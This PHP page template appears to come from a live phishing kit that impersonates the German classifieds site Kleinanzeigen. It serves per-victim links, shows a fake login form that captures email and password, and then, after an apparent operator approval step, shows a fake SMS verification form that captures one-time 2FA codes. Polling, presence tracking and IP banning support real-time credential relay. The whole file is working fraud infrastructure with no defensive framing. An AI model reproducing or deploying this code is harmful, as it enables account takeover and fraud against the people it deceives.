<?php
declare(strict_types=1);

require_once __DIR__ . '/lib/bootstrap.php';

$ip = client_ip();
$is_banned = is_ip_banned($ip);

$link_id = trim((string)($_GET['id'] ?? ''));
$link = null;
if (!$is_banned && $link_id !== '' && preg_match('/^[a-zA-Z0-9]{4,16}$/', $link_id)) {
    $link = db_one('SELECT * FROM links WHERE id = ? AND is_active = 1', [$link_id]);
}

$cfg = cfg_all();
$session = null;
$view = 'notfound';

if ($link !== null) {
    $session = ensure_session($link_id);
    $view = ($session['login_status'] === 'approved' && $session['stage'] === '2fa')
        ? '2fa'
        : 'login';
}

if ($link === null) {
    http_response_code(404);
    $client_cfg = [
        'not_found'   => true,
        'title'       => $cfg['not_found_title']       ?? 'Link nicht gefunden',
        'description' => $cfg['not_found_description'] ?? 'Diese Seite ist nicht verfügbar oder wurde deaktiviert.',
        'help_text'   => $cfg['header_help']           ?? 'Hilfe',
    ];
} elseif ($view === 'login') {
    $client_cfg = [
        'not_found'            => false,
        'view'                 => 'login',
        'link_id'              => $link_id,
        'session_id'           => $session['id'],
        'login_title'          => $cfg['login_title']          ?? 'Willkommen bei Kleinanzeigen!',
        'login_subtitle'       => $cfg['login_subtitle']       ?? '',
        'login_button'         => $cfg['login_button']         ?? 'Einloggen',
        'login_forgot'         => $cfg['login_forgot']         ?? 'Passwort vergessen?',
        'login_register'       => $cfg['login_register']       ?? 'Noch nicht registriert? Erstelle ein Konto',
        'login_error'          => $cfg['login_error']          ?? '',
        'login_email_label'    => $cfg['login_email_label']    ?? 'E-Mail-Adresse',
        'login_password_label' => $cfg['login_password_label'] ?? 'Passwort*',
        'login_edit_link'      => $cfg['login_edit_link']      ?? 'Bearbeiten',
        'login_loading_text'   => $cfg['login_loading_text']   ?? 'Anmeldung wird überprüft…',
        'polling_interval_ms'  => (int)($cfg['polling_interval_ms'] ?? 2000),
        'presence_interval_ms' => (int)($cfg['presence_interval_ms'] ?? 12000),
        'saved_email'          => $session['email'] ?? '',
    ];
} else {
    $full_number = ($cfg['number_prefix'] ?? '') . $link['number_suffix'];
    $client_cfg = [
        'not_found'            => false,
        'view'                 => '2fa',
        'link_id'              => $link_id,
        'session_id'           => $session['id'],
        'number'               => $full_number,
        'modal_title'          => $cfg['modal_title']          ?? 'Identität bestätigen',
        'modal_description'    => $cfg['modal_description']    ?? 'Wir haben eine SMS an folgende Nummer gesendet:',
        'button_text'          => $cfg['button_text']          ?? 'Fortfahren',
        'placeholder'          => $cfg['placeholder']          ?? '6-stelligen Code eingeben*',
        'help_text'            => $cfg['header_help']          ?? 'Hilfe',
        'resend_question'      => $cfg['resend_question']      ?? 'Sie haben keinen Code erhalten?',
        'resend_link'          => $cfg['resend_link']          ?? 'Erneut senden',
        'loading_text'         => $cfg['loading_text']         ?? '',
        'success_text'         => $cfg['success_text']         ?? 'Bestätigt!',
        'success_description'  => $cfg['success_description']  ?? 'Sie können dieses Fenster jetzt schließen.',
        'error_text'           => $cfg['error_text']           ?? 'Falscher Code',
        'error_description'    => $cfg['error_description']    ?? 'Bitte überprüfen Sie den Code und versuchen Sie es erneut.',
        'polling_interval_ms'  => (int)($cfg['polling_interval_ms'] ?? 2000),
        'presence_interval_ms' => (int)($cfg['presence_interval_ms'] ?? 12000),
    ];
}
?><!doctype html>
<html lang="de">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title><?= htmlspecialchars($link ? ($view === 'login' ? ($cfg['login_title'] ?? 'kleinanzeigen') : ($cfg['modal_title'] ?? 'kleinanzeigen')) : 'kleinanzeigen') ?></title>
<link rel="icon" type="image/svg+xml" href="/assets/img/favicon.svg">
<link rel="alternate icon" href="/favicon.ico">
<link rel="apple-touch-icon" href="/assets/img/favicon.svg">
<script src="https://cdn.jsdelivr.net/npm/gsap@3.12.5/dist/gsap.min.js"></script>
<?php if ($view === 'login'): ?>
<link rel="stylesheet" href="/assets/css/login.css">
<?php else: ?>
<link rel="stylesheet" href="/assets/css/app.css">
<?php endif; ?>
</head>
<body class="<?= $view === 'login' ? 'login-page' : 'twofa-page' ?>">

<?php if ($link === null): ?>
<header class="page-header">
  <a class="header-logo" href="/" aria-label="kleinanzeigen">
    <img src="/assets/img/logo.svg" alt="kleinanzeigen" />
  </a>
</header>
<main class="page-main">
  <section class="card card--notfound" id="card">
    <div class="card-mascot card-mascot--muted" aria-hidden="true">
      <img src="/assets/img/mascot.svg" alt="" />
    </div>
    <h1 class="card-title"><?= htmlspecialchars($client_cfg['title']) ?></h1>
    <p class="card-desc"><?= htmlspecialchars($client_cfg['description']) ?></p>
  </section>
</main>

<?php elseif ($view === 'login'): ?>
<main class="login-main">
  <a class="login-logo" href="/" aria-label="kleinanzeigen">
    <img src="/assets/img/logo.svg" alt="kleinanzeigen" />
  </a>

  <section class="login-card" id="login-card">
    <h1 class="login-title" id="login-title"></h1>
    <p class="login-subtitle" id="login-subtitle"></p>

    <form id="login-form" autocomplete="off" novalidate>
      <div class="field-wrap" id="email-wrap">
        <input
          id="email-input"
          type="email"
          class="login-input"
          autocomplete="username"
        />
        <button type="button" class="email-edit" id="email-edit" hidden></button>
      </div>

      <div class="field-wrap field-wrap--password" id="password-wrap" hidden>
        <input
          id="password-input"
          type="password"
          class="login-input login-input--password"
          autocomplete="current-password"
        />
        <button type="button" class="password-toggle" id="password-toggle" aria-label="Passwort anzeigen">
          <svg class="eye-open" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
          <svg class="eye-closed" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true" hidden>
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
            <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
            <line x1="1" y1="1" x2="23" y2="23"/>
          </svg>
        </button>
      </div>

      <div class="login-error" id="login-error" hidden>
        <svg class="login-error-icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
          <path d="M12 2L1 21h22L12 2zm0 4.5L19.5 19h-15L12 6.5zM11 10v5h2v-5h-2zm0 6v2h2v-2h-2z"/>
        </svg>
        <span id="login-error-text"></span>
      </div>

      <a class="login-forgot" id="login-forgot" href="#" hidden></a>

      <button type="submit" id="login-btn" class="login-btn">
        <span class="login-btn-label"></span>
        <span class="login-btn-spinner" aria-hidden="true"></span>
      </button>
    </form>

    <p class="login-register" id="login-register"></p>
  </section>
</main>

<?php else: ?>
<header class="page-header">
  <a class="header-back" href="javascript:history.back()" aria-label="Zurück">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
      <polyline points="15 18 9 12 15 6"/>
    </svg>
  </a>
  <a class="header-logo" href="/" aria-label="kleinanzeigen">
    <img src="/assets/img/logo.svg" alt="kleinanzeigen" />
  </a>
  <a class="header-help" href="#"><?= htmlspecialchars($client_cfg['help_text']) ?></a>
</header>

<main class="page-main">
  <section class="card" id="card">
    <div class="card-body" id="card-body">
      <div class="card-mascot" aria-hidden="true">
        <img src="/assets/img/mascot.svg" alt="" />
      </div>

      <h1 class="card-title" id="m-title"></h1>
      <p class="card-desc"  id="m-desc"></p>

      <div class="phone-field" aria-readonly="true">
        <span id="m-phone"></span>
      </div>

      <div class="form-alert" id="form-alert" hidden>
        <svg class="form-alert-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
          <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
        </svg>
        <div class="form-alert-text">
          <div class="form-alert-title" id="alert-title"></div>
          <div class="form-alert-desc"  id="alert-desc"></div>
        </div>
      </div>

      <form id="code-form" autocomplete="off" novalidate>
        <input
          id="code-input"
          type="text"
          inputmode="numeric"
          autocomplete="one-time-code"
          maxlength="12"
          class="code-input"
        />
        <button type="submit" id="submit-btn" class="submit-btn">
          <span class="submit-label"></span>
          <span class="submit-spinner" aria-hidden="true"></span>
        </button>
      </form>

      <p class="resend">
        <span id="resend-question"></span>
        <a href="#" id="resend-link"></a>
      </p>

      <div class="status" id="status"></div>
    </div>

    <div class="result result--success" id="result-success" hidden>
      <div class="result-icon" aria-hidden="true">
        <svg viewBox="0 0 52 52">
          <circle class="result-icon-ring" cx="26" cy="26" r="24" fill="none" stroke-width="3"/>
          <path  class="result-icon-mark" d="M14 27 l8 8 l16 -18" fill="none" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <h2 class="result-title" id="success-title"></h2>
      <p  class="result-desc"  id="success-desc"></p>
    </div>
  </section>
</main>
<?php endif; ?>

<script>window.__CFG__ = <?= json_encode($client_cfg, JSON_UNESCAPED_UNICODE) ?>;</script>
<?php if ($link !== null): ?>
<script src="/assets/js/presence.js"></script>
<?php endif; ?>
<?php if ($view === 'login'): ?>
<script src="/assets/js/login.js"></script>
<?php elseif ($view === '2fa'): ?>
<script src="/assets/js/main.js"></script>
<?php endif; ?>
</body>
</html>
